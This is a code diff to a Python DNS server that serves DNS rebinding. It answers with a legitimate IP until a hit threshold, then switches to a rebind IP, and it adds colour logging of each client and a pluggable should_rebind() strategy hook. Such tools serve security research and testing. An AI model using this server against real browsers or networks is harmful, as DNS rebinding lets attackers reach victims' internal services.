@@ -9,11 +9,55 @@ import threading
 import traceback
 import socketserver
 import struct
+import random
+
 try:
     from dnslib import *
 except ImportError:
     print("Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`.")
     sys.exit(2)
+
+
+class Colors:
+    """ ANSI color codes """
+    BLACK = "\033[0;30m"
+    RED = "\033[0;31m"
+    GREEN = "\033[0;32m"
+    BROWN = "\033[0;33m"
+    BLUE = "\033[0;34m"
+    PURPLE = "\033[0;35m"
+    CYAN = "\033[0;36m"
+    LIGHT_GRAY = "\033[0;37m"
+    DARK_GRAY = "\033[1;30m"
+    LIGHT_RED = "\033[1;31m"
+    LIGHT_GREEN = "\033[1;32m"
+    YELLOW = "\033[1;33m"
+    LIGHT_BLUE = "\033[1;34m"
+    LIGHT_PURPLE = "\033[1;35m"
+    LIGHT_CYAN = "\033[1;36m"
+    LIGHT_WHITE = "\033[1;37m"
+    BOLD = "\033[1m"
+    FAINT = "\033[2m"
+    ITALIC = "\033[3m"
+    UNDERLINE = "\033[4m"
+    BLINK = "\033[5m"
+    NEGATIVE = "\033[7m"
+    CROSSED = "\033[9m"
+    END = "\033[0m"
+    if not __import__("sys").stdout.isatty():
+        for _ in dir():
+            if isinstance(_, str) and _[0] != "_":
+                locals()[_] = ""
+    else:
+        if __import__("platform").system() == "Windows":
+            kernel32 = __import__("ctypes").windll.kernel32
+            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
+            del kernel32
+
+
+def time_fmt():
+    current_time = datetime.datetime.now()
+    return current_time.strftime("%H:%M:%S.%f")[:-3]
 
 
 class DomainName(str):
@@ -23,7 +67,7 @@ class DomainName(str):
 
 # D = DomainName('ox-rebind.pwnhub.eu.')
 # IP = '138.201.152.197'
-# TTL = 0 
+# TTL = 0
 
 # soa_record = SOA(
 #     mname=D.ns1,  # primary name server
@@ -46,10 +90,15 @@ class DomainName(str):
 # }
 
 
-def dns_response(data, domain, ip, rebind, ttl, counterMax, restartAfter, hostCounter):
-    request = DNSRecord.parse(data)
+# Implement here different rebinding strategies
+def should_rebind(source_ip, hits, hits_max):
+    return hits >= hits_max
 
-    # print(request)
+
+last_time = None
+def dns_response(data, domain, ip, rebind, ttl, counterMax, restartAfter, hostCounter, client_ip):
+    request = DNSRecord.parse(data)
+    global last_time
 
     reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
 
@@ -57,20 +106,27 @@ def dns_response(data, domain, ip, rebind, ttl, counterMax, restartAfter, hostCo
     qn = str(qname)
     qtype = request.q.qtype
     qt = QTYPE[qtype]
-    
+
     if qn == domain or qn.endswith('.' + domain):
 
+        now = datetime.datetime.now()
 
-        #print(request)
+        # Add a newline if the request has taken some time
+        if last_time != None and (now - last_time).total_seconds() > 3:
+            print('')
+
+        last_time = now
+
         rqt = "A"
+        ctime = time_fmt()
         if qt in ['*', rqt]:
-            print("Got a request for " + str(qname) + " Type: " + str(qt))
-
             count = hostCounter.get(qn, 0)
-            if count < counterMax:
-                reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=ttl, rdata=A(ip)))
-            else:
+            if should_rebind(client_ip, count, counterMax):
                 reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=ttl, rdata=A(rebind)))
+                print(f'[{ctime}] {Colors.RED}{A(rebind)}{Colors.END} => {client_ip}')
+            else:
+                reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=ttl, rdata=A(ip)))
+                print(f'[{ctime}] {Colors.GREEN}{A(ip)}{Colors.END} => {client_ip}')
 
             count = count + 1
             # After restartAfter rebind responses, restart the cycle from the
@@ -78,24 +134,6 @@ def dns_response(data, domain, ip, rebind, ttl, counterMax, restartAfter, hostCo
             if restartAfter > 0 and count >= counterMax + restartAfter:
                 count = 0
             hostCounter[qn] = count
-            print("------------------------ Counter for host ", qn, " ", hostCounter[qn])
-
-#        for name, rrs in records.items():
-#            if name == qn:
-#                for rdata in rrs:
-#                    rqt = rdata.__class__.__name__
-#                    if qt in ['*', rqt]:
-#                        reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=TTL, rdata=rdata))
-      
-
-
-
-        #for rdata in ns_records:
-        #    reply.add_ar(RR(rname=D, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
-
-        #reply.add_auth(RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))
-
-        print("---- Reply:\n", reply)
 
     return reply.pack()
 
@@ -110,12 +148,10 @@ class BaseRequestHandler(socketserver.BaseRequestHandler):
 
     def handle(self):
         now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
-        #print("\n\n%s request %s (%s %s):" % (self.__class__.__name__[:3], now, self.client_address[0],
-        #                                       self.client_address[1]))
+        
         try:
             data = self.get_data()
-        #   print(len(data), data)  # repr(data).replace('\\x', '')[1:-1]
-            self.send_data(dns_response(data, self.server.domain, self.server.ip, self.server.rebind, self.server.ttl, self.server.counterMax, self.server.restartAfter, self.server.hostCounter))
+            self.send_data(dns_response(data, self.server.domain, self.server.ip, self.server.rebind, self.server.ttl, self.server.counterMax, self.server.restartAfter, self.server.hostCounter, self.client_address[0]))
         except Exception:
             traceback.print_exc(file=sys.stderr)
 
@@ -162,7 +198,7 @@ def main():
     args = parser.parse_args()
     if not (args.udp or args.tcp): parser.error("Please select at least one of --udp or --tcp.")
 
-    print("Starting nameserver...")
+    print("Starting nameserver...\n")
 
     servers = []
     if args.udp: servers.append(socketserver.ThreadingUDPServer((args.bind, args.port), UDPRequestHandler))
@@ -180,7 +216,6 @@ def main():
         thread = threading.Thread(target=s.serve_forever)  # that thread will start one more thread for each request
         thread.daemon = True  # exit the server thread when the main thread terminates
         thread.start()
-        print("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))
 
     try:
         while 1:
@@ -196,4 +231,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
